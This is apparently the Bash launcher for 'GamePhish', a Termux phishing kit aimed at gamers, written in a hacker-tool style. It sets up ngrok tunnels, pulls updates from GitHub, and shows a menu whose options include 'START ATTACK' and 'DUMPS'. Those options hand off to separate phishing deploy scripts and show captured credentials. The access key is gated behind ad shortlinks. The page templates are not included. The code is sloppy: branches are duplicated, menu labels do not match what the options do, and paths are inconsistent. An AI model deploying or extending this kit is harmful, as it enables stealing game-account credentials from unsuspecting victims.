clear

about() { 

echo -e '\e[91m

                     ──▐─▌──▐─▌──

                     ─▐▌─▐▌▐▌─▐▌─

                     ─█▄▀▄██▄▀▄█─

                     ──▄──██▌─▄──

                     ▄▀─█▀██▀█─▀▄

                     ▐▌▐▌─▐▌─▐▌▐▌

                     ─▐─█────█─▌─

                     ────▌──▐────

'

echo -e "\e[93m                    CALL ME \e[92mJATT" | pv -qL 10

echo -e "\e[93m               REAL NAME \e[92mJATIN KALWAR" | pv -qL 10

echo -e "\e[93m             IAM FROM \e[92mYOURHACKINGHOUSE" | pv -qL 10

echo -e "\e[93m        IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10

echo -e "\e[93m       HOPE YOU LIKE THIS MASTER BOMBER 2.O" | pv -qL 10

echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10

echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10

echo -e "\e[93m        MY WEBSITE:\e[92m https://bit.ly/2QT6dSR \e[0m" | pv -qL 10

echo -e "\e[92m                BYEE.............." | pv -qL 10

sleep 8.0

ban

}

  upd(){

if [ -d "$HOME/GamePhish" ];

then

cd $HOME

rm -rf GamePhish

elif [ -d "$HOME/GamePhish" ];

then

cd $HOME

rm -rf GamePhish

else

echo

exit 1

fi

cd $HOME

sleep 1

echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"

echo

printf "                     \e[96m["

# While process is running...

while git clone https://github.com/jatinkalwar/GamePhish 2> /dev/null; do 

    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"

    sleep 1

done

printf "\e[96m]\e[0m"

echo

echo

echo

printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"

sleep 2.0

cd $HOME

cd GamePhish

bash gamephish.sh

}

upda() {

 

if [ -d "$HOME/GamePhish/core" ];

then

cd $HOME/GamePhish/core

rm gamers.txt

elif [ -d "$HOME/GamePhish/core" ];

then

cd $HOME/GamePhish/core

rm gamers.txt

else

echo

exit 1

fi

cd $HOME

sleep 1

echo -e "         \e[96mUPDATING NGROK, PLEASE WAIT FOR A WHILE...!\e[0m"

echo

printf "                     \e[96m["

# While process is running...

while git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null; do 

    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"

    sleep 1

done

printf "\e[96m]\e[0m"

echo

echo

echo

printf "\e[96m           NGROK UPDATED SUCCESSFULLY (LATEST VERSION)..!\e[0m"

sleep 2.0

cd $HOME

cd toolupdater/error

mv gamers.txt $HOME/GamePhish/core

cd $HOME

rm -rf toolupdater

}

echo -e " \e[96m

                                 ████████ \e[0m"

echo "                             ████████████████

                               █─▄▀█──█▀▄─█

                              ▐▌──────────▐▌"

echo -e "\e[0m                              █▌\e[91m▀▄──▄▄──▄▀\e[0m▐█"

echo -e "\e[0m                             ▐██──\e[91m▀▀\e[91m──▀▀──\e[0m██" 

echo "                            ▄████▄──▐▌──▄████▄"

echo -e "\e[91m

                

        ___    __    __  __  ____  ____  _   _  ____  ___  _   _ 

       / __)  /__\  (  \/  )( ___)(  _ \( )_( )(_  _)/ __)( )_( )

      ( (_-. /(__)\  )    (  )__)  )___/ ) _ (  _)(_ \__ \ ) _ ( "

echo -e "\e[96m       \___/(__)(__)(_/\/\_)(____)(__)  (_) (_)(____)(___/(_) (_)"

echo      

echo -e "                       \e[92m TOOL BY THE JATIN KALWAR\e[0m"

echo

wget -q --spider http://google.com

if [ $? -eq 0 ]; then

echo

echo -e "                             STATUS \e[1;96m[\e[0m\e[92mONLINE\e[0m\e[1;96m]"

echo

banner(){

echo -e "\e[96m                           GAMEPHISH NGROK SETUP\e[96m"

echo -e "\e[96m                        ╔═══════════════════════╗\e[0m"

echo -e "\e[91m                        ║\e[93m If you are using wifi\e[91m ║\e[0m"                                                             

echo -e "\e[91m                        ║         \e[93mType\e[92m 1\e[91m        ║\e[0m"

echo -e "\e[96m                        ║                       ║\e[91m"                                                                         

echo -e "\e[96m                        ║         (Or)          ║\e[96m"

echo -e "\e[96m                        ║                       ║\e[96m"

echo -e "\e[91m                        ║ \e[93mIf you are using data\e[91m ║\e[0m"              

echo -e "\e[91m                        ║         \e[93mType\e[92m 2\e[91m        ║\e[0m"

echo -e "\e[96m                        ║                       ║"

echo -e "\e[96m                        ╚═══════════════════════╝"

echo -n -e "\e[32mSELECT\e[96m[\e[33m1/2\e[96m]\e[33m: \e[0m"

read hulk

if [ $hulk = 1 ];then

cd $HOME/GamePhish/core

rm ngrok > /dev/null 2>&1

unzip ngrok-wifi.zip > /dev/null 2>&1

chmod +x ngrok

elif [ $hulk = 2 ];then

cd $HOME/GamePhish/core

rm ngrok > /dev/null 2>&1

unzip ngrok-data.zip > /dev/null 2>&1

chmod +x ngrok

else

echo "                                  !Error"

fi

}

banner

sleep 4.0

else

echo

    echo -e "                             STATUS \e[1;93m[\e[0m\e[91mOFFLINE\e[0m\e[1;93m]\e[0m"

echo

sleep 1.0

bash gamephish.sh

fi  

clear

echo -e " \e[96m

                                 ████████ \e[0m"

echo "                             ████████████████

                               █─▄▀█──█▀▄─█

                              ▐▌──────────▐▌"

echo -e "\e[0m                              █▌\e[91m▀▄──▄▄──▄▀\e[0m▐█"

echo -e "\e[0m                             ▐██──\e[91m▀▀\e[91m──▀▀──\e[0m██" 

echo "                            ▄████▄──▐▌──▄████▄"

echo -e "\e[91m

                

        ___    __    __  __  ____  ____  _   _  ____  ___  _   _ 

       / __)  /__\  (  \/  )( ___)(  _ \( )_( )(_  _)/ __)( )_( )

      ( (_-. /(__)\  )    (  )__)  )___/ ) _ (  _)(_ \__ \ ) _ ( "

echo -e "\e[96m       \___/(__)(__)(_/\/\_)(____)(__)  (_) (_)(____)(___/(_) (_)"

echo      

echo -e "                       \e[92m TOOL BY THE JATIN KALWAR\e[0m"

upda

clear 

echo -e " \e[96m

                                 ████████ \e[0m"

echo "                             ████████████████

                               █─▄▀█──█▀▄─█

                              ▐▌──────────▐▌"

echo -e "\e[0m                              █▌\e[91m▀▄──▄▄──▄▀\e[0m▐█"

echo -e "\e[0m                             ▐██──\e[91m▀▀\e[91m──▀▀──\e[0m██" 

echo "                            ▄████▄──▐▌──▄████▄"

echo -e "\e[91m

                

        ___    __    __  __  ____  ____  _   _  ____  ___  _   _ 

       / __)  /__\  (  \/  )( ___)(  _ \( )_( )(_  _)/ __)( )_( )

      ( (_-. /(__)\  )    (  )__)  )___/ ) _ (  _)(_ \__ \ ) _ ( "

echo -e "\e[96m       \___/(__)(__)(_/\/\_)(____)(__)  (_) (_)(____)(___/(_) (_)"

echo      

echo -e "                       \e[92m TOOL BY THE JATIN KALWAR\e[0m"

echo

echo -e "\e[96m        |-----------------------[V 7.6]-----------------------|"

echo -e "\e[96m        |-------------------\e[92mSELECT OPTIONS\e[96m--------------------|"

echo -e "\e[96m        |-----------------------------------------------------|"

echo -e "\e[96m        |                                                     |"

echo -e "\e[96m        |                                                     |"

echo -e "\e[96m        |                [\e[92m1\e[96m]==> START ATTACK                  |"

echo -e "\e[96m        |                [\e[92m2\e[96m]==> DUMPS                         |"

echo -e "\e[96m        |                [\e[92m3\e[96m]==> ABOUT                         |"

echo -e "\e[96m        |                [\e[92m4\e[96m]==> UPDATE                        |"

echo -e "\e[96m        |                [\e[92m5\e[96m]==> CHAT NOW                      |"

echo -e "\e[96m        |                [\e[92m6\e[96m]==> ACCESS KEY                    |"

echo -e "\e[96m        |                [\e[92m7\e[96m]==> CHECK SPEED                   |"

echo -e "\e[96m        |                [\e[92m8\e[96m]==> EXIT                          |"

echo -e "\e[96m        |                                                     |"

echo -e "\e[96m        |-----------------------------------------------------|"

echo -e "\e[96m        |---------------------\e[91mHEY HACKER\e[96m----------------------|"

echo -e "\e[96m        |-----------------------------------------------------|"

read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] SELECT OPTION: \e[0m' option

if [[ $option == 1 || $option == 01 ]]; then

 cd $HOME/fisher

wget -L https://raw.githubusercontent.com/jatinkalwar/toolupdater/main/error/gamers.txt 2>/dev/null

banner

echo -e "\e[93mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50

echo -e "\e[93m"

read  -p "ACCESS KEY: " access

cd $HOME/GamePhish/core/updater

bas=$(cat gamers.txt)

if [[ $access = $bas ]];

then

clear

  cd $HOME/mrphish/core/deploys/gaming

bash menu.sh

        

else

clear

echo " "

echo -e "               \e[34m ============================\e[34m"

echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"

echo -e "               \e[34m |                          |"

echo -e "               \e[34m |    Use shortlink for key |"

echo -e "               \e[34m |\e[92mhttps://gplinks.co/8QcyEeAZ\e[34m |"

echo -e "               \e[34m |            [OR]          |"

echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m|"

echo -e "               \e[34m ============================\e[34m"

echo " "

sleep 5.0

fi

ban

elif [[ $option == 2 || $option == 02 ]]; then

echo

cd $HOME/GamePhish/core/

bash show.sh

elif [[ $option == 3 || $option == 03 ]]; then

echo

cd $HOME/GamePhish/core/about

bash about.sh

elif [[ $option == 4 || $option == 04 ]]; then

echo

upd

echo

elif [[ $option == 7 || $option == 07 ]]; then

echo

cd $HOME/GamePhish/core

bash intspeed.sh

echo

elif [[ $option == 5 ]]; then

clear

printf "                    \e[1;96m Have A Good Day ........! \e[0m\n"

echo

sleep 3.0

exit 3

elif [[ $option == 6 || $option == 06 ]]; then

echo

clear

am start -a android.intent.action.VIEW -d https://bitly.com/3jFprHy

clear

echo

elif [[ $option == 8 || $option == 08 ]]; then

echo

clear

am start -a android.intent.action.VIEW -d http://wa.me/994408609255

else

printf "                \e[1;92m [!] Invalid option!\e[0m\n"

sleep 1

fi

echo

cd $HOME/GamePhish

bash mr.sh
